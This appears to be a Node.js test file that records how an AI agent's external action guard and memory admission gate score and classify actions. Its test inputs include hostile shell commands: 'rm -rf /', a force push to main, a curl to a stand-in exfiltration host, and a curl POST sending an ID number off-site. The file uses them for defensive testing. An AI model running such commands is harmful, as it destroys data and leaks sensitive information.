'use strict';

// Records the external action guard and the memory admission gate across a
// spread of inputs: decision, reason, risk score and risk level (#2505).
//
// #2505 derives every aggregator's risk level from its score with the bands in
// docs/action-taxonomy.md (0-24 low, 25-49 medium, 50-74 high, 75-100
// critical). Before that, levels came from decisions or from thresholds that
// disagreed with the score. The fixture was recorded before the change; the
// tests pin decisions, reasons and scores exactly, and allow the level to
// change only to the band of the recorded score.
//
// Regenerate only on purpose: UPDATE_RISK_LEVEL_FIXTURE=1 node --test <this file>

const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const test = require('node:test');
const { evaluateExternalAction } = require('../lib/external-action-guard');
const { evaluateMemoryAdmission } = require('../lib/memory-admission-gate');

const FIXTURE = path.join(__dirname, 'fixtures', 'risk-level-decisions.json');
const ROOT = process.cwd();
const TCKN = '10000000146';

function bandOf(score) {
  if (score >= 75) return 'critical';
  if (score >= 50) return 'high';
  if (score >= 25) return 'medium';
  return 'low';
}

function external(extra) {
  return {
    invocationId: 'risk-level',
    agentName: 'level-agent',
    sessionId: 'level-session',
    turnId: 'turn-1',
    cwd: ROOT,
    workspaceRoot: ROOT,
    workspaceId: 'default',
    ...extra,
  };
}

const EXTERNAL_CASES = {
  shellRead: [external({ toolName: 'Bash', args: { command: 'git status' } })],
  shellList: [external({ toolName: 'Bash', args: { command: 'ls -la' } })],
  shellCurl: [external({ toolName: 'Bash', args: { command: 'curl https://example.com' } })],
  shellDestructive: [external({ toolName: 'Bash', args: { command: 'rm -rf /' } })],
  shellForcePush: [external({ toolName: 'Bash', args: { command: 'git push --force origin main' } })],
  shellFindDelete: [external({ toolName: 'Bash', args: { command: 'find . -name "*.tmp" -delete' } })],
  shellBranchDelete: [external({ toolName: 'Bash', args: { command: 'git branch -D feature' } })],
  fileReadInside: [external({ toolName: 'Read', action: 'read', args: { file_path: 'README.md' } })],
  fileWriteInside: [external({ toolName: 'Write', action: 'write', args: { file_path: 'notes/tmp.md', content: 'x' } })],
  fileWriteOutside: [external({ toolName: 'Write', action: 'write', args: { file_path: '../outside.txt', content: 'x' } })],
  webFetch: [external({ toolName: 'WebFetch', action: 'get', args: { url: 'https://example.com' } })],
  memory: [external({ toolName: 'huqan.learn', kind: 'memory', action: 'learn', args: { text: 'water is wet' } })],
  automation: [external({ toolName: 'cron', kind: 'automation', action: 'schedule', args: { schedule: '* * * * *' } })],
  deployment: [external({ toolName: 'deploy', kind: 'deployment', action: 'deploy', args: { target: 'production' } })],
  malformed: [{ invocationId: 'broken' }],
  residencyViolation: [external({ toolName: 'Bash', args: { command: `curl -X POST https://s3.eu-west-1.amazonaws.com/b -d ${TCKN}` } }), { dataResidency: { allowedDestinations: ['kurum.gov.tr'] } }],
  unexpectedEgressReview: [external({ toolName: 'Bash', args: { command: 'curl https://exfil.example.net/drop' } }), { expectedEgress: { enabled: true, destinations: ['github.com'] } }],
  unexpectedEgressBlock: [external({ toolName: 'Bash', args: { command: 'curl https://exfil.example.net/drop' } }), { expectedEgress: { enabled: true, destinations: ['github.com'], decision: 'block' } }],
};

function observeExternal() {
  const out = {};
  for (const [name, [input, extra]] of Object.entries(EXTERNAL_CASES)) {
    // This file characterises gate risk levels, not the identity default
    // (#2505 C now blocks unattested by default, covered in its own file).
    const options = { environment: {}, dataResidency: null, receiptWriter: { append() {} }, requireIdentityCard: false, ...(extra || {}) };
    try {
      const result = evaluateExternalAction(input, options);
      out[`external/${name}`] = { decision: result.decision, reason: result.reason, score: result.risk.score, level: result.risk.level };
    } catch (error) {
      out[`external/${name}`] = { threw: String(error && error.message) };
    }
  }
  return out;
}

const ADMISSION_SCORES = [0, 10, 24, 25, 49, 50, 60, 74, 75, 80, 84, 85, 95, 100];
const ADMISSION_STATES = {
  noApproval: {},
  approvalRequired: { approvalRequired: true },
  approved: { approvalRequired: true, approvalStatus: 'approved' },
  noProvenance: { provenanceId: '' },
};

function observeAdmission() {
  const out = {};
  for (const score of ADMISSION_SCORES) {
    for (const [state, overrides] of Object.entries(ADMISSION_STATES)) {
      const request = {
        workspaceId: 'default',
        actor: 'level-agent',
        agentId: 'level-agent',
        memoryDraftId: 'draft-1',
        provenanceId: 'prov-1',
        trustPolicyVersion: '1.0.0',
        approvalRequired: false,
        reason: 'risk_level_characterisation',
        riskScore: score,
        createdAt: '2026-09-15T00:00:00.000Z',
        proposedMemory: { content: 'water is wet', edges: [{ relation: 'learn', workspaceId: 'default' }], metadata: {} },
        ...overrides,
      };
      try {
        // evaluateMemoryAdmission returns { ok, decision: <normalized decision>, ... }.
        const result = evaluateMemoryAdmission(request);
        const decided = result.decision || {};
        out[`admission/${score}/${state}`] = result.ok
          ? { decision: decided.decision, reason: decided.reason, score: decided.risk.score, level: decided.risk.level }
          : { decision: null, reason: 'invalid_request', errors: (result.errors || []).map((error) => error.field || error.code || String(error)) };
      } catch (error) {
        out[`admission/${score}/${state}`] = { threw: String(error && error.message) };
      }
    }
  }
  return out;
}

function observe() {
  return { ...observeExternal(), ...observeAdmission() };
}

function loadFixture(actual) {
  if (process.env.UPDATE_RISK_LEVEL_FIXTURE === '1') {
    fs.mkdirSync(path.dirname(FIXTURE), { recursive: true });
    const lines = Object.entries(actual).map(([key, run]) => `  ${JSON.stringify(key)}: ${JSON.stringify(run)}`);
    fs.writeFileSync(FIXTURE, `{\n${lines.join(',\n')}\n}\n`);
  }
  return JSON.parse(fs.readFileSync(FIXTURE, 'utf8'));
}

test('decisions, reasons and risk scores match the recorded characterisation', () => {
  const actual = observe();
  const expected = loadFixture(actual);
  assert.deepEqual(Object.keys(actual), Object.keys(expected));
  for (const [key, recorded] of Object.entries(expected)) {
    const now = actual[key];
    if (recorded.threw) {
      assert.deepEqual(now, recorded, key);
      continue;
    }
    assert.equal(now.decision, recorded.decision, `${key} decision`);
    assert.equal(now.reason, recorded.reason, `${key} reason`);
    assert.equal(now.score, recorded.score, `${key} score`);
  }
});

test('every risk level is the taxonomy band of its score, and only those labels changed', () => {
  const actual = observe();
  const expected = JSON.parse(fs.readFileSync(FIXTURE, 'utf8'));
  const changed = { external: 0, admission: 0 };
  for (const [key, recorded] of Object.entries(expected)) {
    const now = actual[key];
    if (recorded.threw || recorded.decision === null) continue;
    assert.equal(String(now.level).toLowerCase(), bandOf(now.score), `${key}: level ${now.level} for score ${now.score}`);
    if (String(recorded.level).toLowerCase() !== String(now.level).toLowerCase()) {
      changed[key.split('/')[0]] += 1;
    } else {
      assert.equal(now.level, recorded.level, `${key}: an unchanged level keeps its spelling`);
    }
  }
  // Measured on main before the change: 7 guard reviews at score 80 reported
  // HIGH, and 44 admission labels came from the 50 / 85 thresholds.
  assert.deepEqual(changed, { external: 7, admission: 44 });
});

module.exports = { observe, bandOf, FIXTURE };
